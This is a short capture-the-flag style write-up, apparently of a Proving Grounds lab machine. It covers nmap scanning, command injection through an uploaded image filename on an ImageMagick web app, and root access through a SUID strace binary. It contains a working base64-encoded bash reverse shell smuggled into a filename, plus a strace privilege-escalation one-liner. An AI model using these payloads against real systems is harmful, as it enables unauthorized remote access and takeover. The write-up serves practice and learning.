# nmap
```
┌──(kali㉿kali)-[~/PG/image]
└─$ nmap -p- --min-rate 10000 192.168.152.178  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-22 21:35 EST
Nmap scan report for 192.168.152.178
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.77 seconds
                                                                                                                                           
┌──(kali㉿kali)-[~/PG/image]
└─$ nmap -p 22,80 -sCV 192.168.152.178         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-22 21:36 EST
Nmap scan report for 192.168.152.178
Host is up (0.039s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: ImageMagick Identifier
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.90 seconds
```

# web enum
![Pasted image 20250223103734](<0. Attachments/Pasted image 20250223103734.png>)

so i found a discussion - https://github.com/ImageMagick/ImageMagick/issues/6339

![Pasted image 20250223105358](<0. Attachments/Pasted image 20250223105358.png>)

after trying my variations i finally got an interaction
![Pasted image 20250223105427](<0. Attachments/Pasted image 20250223105427.png>)
# initial access
```
echo "sh -i >& /dev/tcp/192.168.45.203/4444 0>&1" | base64

cp test.jpg '|test"`echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4yMDMvNDQ0NCAwPiYxCg== | base64 -d | bash`".jpg'
```

then upload the file with your nc listener
![Pasted image 20250223105604](<0. Attachments/Pasted image 20250223105604.png>)

![Pasted image 20250223105624](<0. Attachments/Pasted image 20250223105624.png>)

# priv esc enum

shell upgrade
![Pasted image 20250223105807](<0. Attachments/Pasted image 20250223105807.png>)

using linpeas.sh we find
![Pasted image 20250223110304](<0. Attachments/Pasted image 20250223110304.png>)

# exploit
https://gtfobins.github.io/gtfobins/strace/

![Pasted image 20250223110342](<0. Attachments/Pasted image 20250223110342.png>)

# priv esc

```
/usr/bin/strace -o /dev/null /bin/bash -p
```

![Pasted image 20250223110520](<0. Attachments/Pasted image 20250223110520.png>)

![Pasted image 20250223110641](<0. Attachments/Pasted image 20250223110641.png>)

